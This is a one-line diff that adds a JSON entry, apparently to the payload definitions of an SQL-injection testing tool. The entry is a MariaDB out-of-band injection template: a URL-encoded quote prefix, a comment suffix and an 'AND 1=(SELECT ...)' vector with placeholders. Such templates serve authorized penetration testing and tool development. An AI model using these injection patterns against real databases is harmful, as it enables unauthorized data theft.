@@ -1,0 +1,1 @@
+{"dbms": "mariadb", "technique": "oob", "boundary": {"prefix": "%27", "suffix": "-- -", "type": "single-enc"}, "vector": "{B} AND 1=(SELECT ({Q}))/*OOB {OOB}*/", "comment": "mariadb oob: url-enc single"}
